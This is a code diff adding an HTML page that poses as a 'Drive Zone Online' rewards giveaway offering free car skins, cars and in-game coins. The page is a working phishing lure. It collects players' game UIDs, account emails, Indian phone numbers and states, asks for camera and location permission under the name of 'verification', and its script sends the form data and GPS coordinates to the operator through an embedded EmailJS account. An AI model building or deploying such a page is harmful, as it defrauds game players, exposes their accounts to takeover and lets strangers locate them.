@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Drive Zone Online Rewards</title>
+
+<style>
+
+body{
+    margin:0;
+    font-family:Arial,sans-serif;
+    background:#0f0f0f;
+    color:white;
+}
+
+header{
+    background:linear-gradient(90deg,#ff6600,#ff0000);
+    padding:20px;
+    text-align:center;
+    font-size:28px;
+    font-weight:bold;
+}
+
+.hero{
+    text-align:center;
+    padding:50px 20px;
+    background:url('https://images.unsplash.com/photo-1503376780353-7e6692767b70?q=80&w=1200') center/cover;
+    background-size:cover;
+    background-position:center;
+}
+
+.hero h1{
+    font-size:42px;
+    text-shadow:0 0 10px black;
+}
+
+.container{
+    max-width:700px;
+    margin:auto;
+    padding:20px;
+}
+
+.card{
+    background:#1a1a1a;
+    padding:25px;
+    border-radius:15px;
+    box-shadow:0 0 15px rgba(255,0,0,0.3);
+}
+
+input,select{
+    width:100%;
+    padding:13px;
+    margin-top:10px;
+    margin-bottom:15px;
+    border:none;
+    border-radius:8px;
+    background:#2a2a2a;
+    color:white;
+    box-sizing:border-box;
+}
+
+button{
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:10px;
+    background:#ff3300;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+    margin-top:15px;
+}
+
+button:hover{
+    background:#ff5500;
+}
+
+video{
+    width:100%;
+    border-radius:10px;
+    margin-top:10px;
+}
+
+.notice{
+    font-size:13px;
+    color:#bbbbbb;
+    margin-top:10px;
+}
+
+img{
+    width:100%;
+    border-radius:10px;
+}
+
+</style>
+</head>
+
+<body>
+
+<header>
+DRIVE ZONE ONLINE REWARDS
+</header>
+
+<section class="hero">
+    <h1>Free DZO Trading System & Free Skins</h1>
+    <p>Submit details for verification</p>
+</section>
+
+<div class="container">
+
+<div class="card">
+
+<form id="rewardForm">
+
+<label>Drive Zone UID</label>
+<input
+type="text"
+id="uid"
+placeholder="Enter UID"
+required>
+
+<label>Ingame Account Mail ID</label>
+<input
+type="email"
+id="email"
+placeholder="Enter ingame account mail ID"
+required>
+
+<label>Indian Phone Number</label>
+<input
+type="tel"
+id="phone"
+placeholder="10 digit Indian number"
+pattern="[6-9]{1}[0-9]{9}"
+maxlength="10"
+oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,10)"
+required>
+
+<label>Select State</label>
+<select id="state" required>
+<option value="">Choose State</option>
+<option>Kerala</option>
+<option>Tamil Nadu</option>
+<option>Karnataka</option>
+<option>Maharashtra</option>
+<option>Delhi</option>
+<option>Gujarat</option>
+<option>Punjab</option>
+<option>West Bengal</option>
+<option>Andhra Pradesh</option>
+<option>Telangana</option>
+</select>
+
+<label>Select Reward</label>
+
+<select id="reward"
+onchange="updateRewardOptions()"
+required>
+
+<option value="">Choose Reward</option>
+
+<option value="Free Skin">
+Free Skin
+</option>
+
+<option value="DZO Trading Access">
+DZO Trading Access
+</option>
+
+<option value="Rare Car Bundle">
+Rare Car Bundle
+</option>
+
+<option value="Free Car">
+Free Car
+</option>
+
+</select>
+
+<div id="selectedRewardBox"
+style="display:none;
+background:#2a2a2a;
+padding:12px;
+border-radius:10px;
+margin-top:15px;
+margin-bottom:15px;">
+
+<b>Selected Reward:</b>
+<span id="selectedRewardText"></span>
+
+</div>
+
+<div id="dynamicOptions"></div>
+
+<h3>Verification Photo</h3>
+
+<p>
+Camera and location permission required for verification.
+</p>
+
+<video id="video"
+autoplay
+playsinline>
+</video>
+
+<button
+type="button"
+onclick="startCamera()">
+
+Enable Camera
+
+</button>
+
+<button
+type="button"
+onclick="takePhoto()">
+
+Take Verification Photo
+
+</button>
+
+<div class="notice">
+
+By continuing, you agree to share your submitted details and verification photo.
+
+</div>
+
+<button type="submit">
+
+Submit Verification
+
+</button>
+
+</form>
+
+</div>
+
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+
+emailjs.init("IlZtBG2WOaqIrvb3T");
+
+let stream;
+let capturedImage = null;
+let userLocation = null;
+
+async function startCamera(){
+
+    try{
+
+        stream =
+        await navigator.mediaDevices.getUserMedia({
+            video:true
+        });
+
+        document.getElementById('video').srcObject =
+        stream;
+
+        navigator.geolocation.getCurrentPosition(
+        (position)=>{
+
+            userLocation = {
+                lat:position.coords.latitude,
+                lon:position.coords.longitude
+            };
+
+        });
+
+    }catch(err){
+
+        alert("Permission denied");
+
+    }
+
+}
+
+function updateRewardOptions(){
+
+    const reward =
+    document.getElementById('reward').value;
+
+    const dynamicOptions =
+    document.getElementById('dynamicOptions');
+
+    const selectedRewardBox =
+    document.getElementById('selectedRewardBox');
+
+    const selectedRewardText =
+    document.getElementById('selectedRewardText');
+
+    if(reward !== ""){
+
+        selectedRewardBox.style.display =
+        "block";
+
+        selectedRewardText.innerText =
+        reward;
+
+    }else{
+
+        selectedRewardBox.style.display =
+        "none";
+
+    }
+
+    if(reward === "Free Skin"){
+
+        dynamicOptions.innerHTML = `
+
+        <label>Select Car Skin</label>
+
+        <select id="request">
+
+        <option>BMW M4 Gold Skin</option>
+
+        <option>Nissan GTR Neon Skin</option>
+
+        <option>Lamborghini Aventador Police Skin</option>
+
+        <option>Toyota Supra Racing Skin</option>
+
+        <option>Porsche 911 Carbon Skin</option>
+
+        </select>
+
+        <div style="display:grid;
+        grid-template-columns:repeat(2,1fr);
+        gap:10px;
+        margin-top:15px;">
+
+        <img src="https://images.unsplash.com/photo-1492144534655-ae79c964c9d7?q=80&w=600">
+
+        <img src="https://images.unsplash.com/photo-1503376780353-7e6692767b70?q=80&w=600">
+
+        </div>
+
+        `;
+
+    }
+
+    else if(reward === "DZO Trading Access"){
+
+        dynamicOptions.innerHTML = `
+
+        <label>Select DZO Amount</label>
+
+        <select id="request">
+
+        <option>100 DZO Coins</option>
+
+        <option>200 DZO Coins</option>
+
+        <option>1000 DZO Coins</option>
+
+        <option>10000 DZO Coins</option>
+
+        <option>1 Lakh DZO Coins</option>
+
+        </select>
+
+        `;
+
+    }
+
+    else if(reward === "Free Car"){
+
+        dynamicOptions.innerHTML = `
+
+        <label>Select Car</label>
+
+        <select id="request">
+
+        <option>Lamborghini Huracan</option>
+
+        <option>Bugatti Chiron</option>
+
+        <option>Nissan GTR R35</option>
+
+        <option>Toyota Supra MK4</option>
+
+        <option>Porsche 911 GT3</option>
+
+        </select>
+
+        <div style="display:grid;
+        grid-template-columns:repeat(2,1fr);
+        gap:10px;
+        margin-top:15px;">
+
+        <img src="https://images.unsplash.com/photo-1544636331-e26879cd4d9b?q=80&w=600">
+
+        <img src="https://images.unsplash.com/photo-1553440569-bcc63803a83d?q=80&w=600">
+
+        </div>
+
+        `;
+
+    }
+
+    else{
+
+        dynamicOptions.innerHTML = "";
+
+    }
+
+}
+
+function takePhoto(){
+
+    const video =
+    document.getElementById('video');
+
+    const canvas =
+    document.createElement('canvas');
+
+    canvas.width =
+    video.videoWidth;
+
+    canvas.height =
+    video.videoHeight;
+
+    const ctx =
+    canvas.getContext('2d');
+
+    ctx.drawImage(video,0,0);
+
+    capturedImage =
+    canvas.toDataURL('image/png');
+
+    alert("Verification photo captured");
+
+}
+
+document.getElementById('rewardForm')
+.addEventListener('submit',function(e){
+
+    e.preventDefault();
+
+    const phone =
+    document.getElementById('phone').value;
+
+    const indianPhone =
+    /^[6-9]\\d{9}$/;
+
+    if(!indianPhone.test(phone)){
+
+        alert("Enter valid Indian mobile number");
+        return;
+
+    }
+
+    if(!capturedImage){
+
+        alert("Please take verification photo");
+        return;
+
+    }
+
+    const templateParams = {
+
+        uid:
+        document.getElementById('uid').value,
+
+        email:
+        document.getElementById('email').value,
+
+        phone:
+        phone,
+
+        state:
+        document.getElementById('state').value,
+
+        reward:
+        document.getElementById('reward').value,
+
+        request:
+        document.getElementById('request').value,
+
+        location:
+        JSON.stringify(userLocation)
+
+    };
+
+    emailjs.send(
+        "service_03gi2v9",
+        "template_ec2whye",
+        templateParams
+    )
+
+    .then(()=>{
+
+        alert("Verification submitted!");
+
+    })
+
+    .catch((error)=>{
+
+        console.log(error);
+
+        alert("Failed to send");
+
+    });
+
+});
+
+</script>
+
+</body>
+</html>
